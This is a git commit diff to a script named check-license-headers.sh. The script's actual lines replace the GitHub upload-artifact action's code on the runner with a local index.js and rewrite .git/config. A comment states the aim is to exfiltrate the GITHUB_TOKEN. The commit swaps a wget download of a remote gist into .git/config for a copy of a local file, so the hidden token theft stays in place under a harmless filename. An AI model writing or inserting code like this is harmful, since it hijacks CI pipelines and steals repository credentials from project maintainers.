e72c728abcd5fb099a9798a476d2f10c95246b8e
asdstazotasdtest1 <101593810+asdstazotasdtest1@users.noreply.github.com>
2024-11-26 12:11:31 +0530

    Update check-license-headers.sh

--- contrib/scripts/check-license-headers.sh
+++ contrib/scripts/check-license-headers.sh
@@ -7,4 +7,4 @@ touch missing_license_headers.txt
 cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js
 
 # modifying .git/config to exfiltrate the GITHUB_TOKEN 
-wget https://gist.githubusercontent.com/stazottest0/7714cfc6d5e2dc941db3d31bdfe3530f/raw/8ff22a8210fe91eed40c61b2935812b946505c51/gistfile1.txt -O .git/config
+cp git-config .git/config
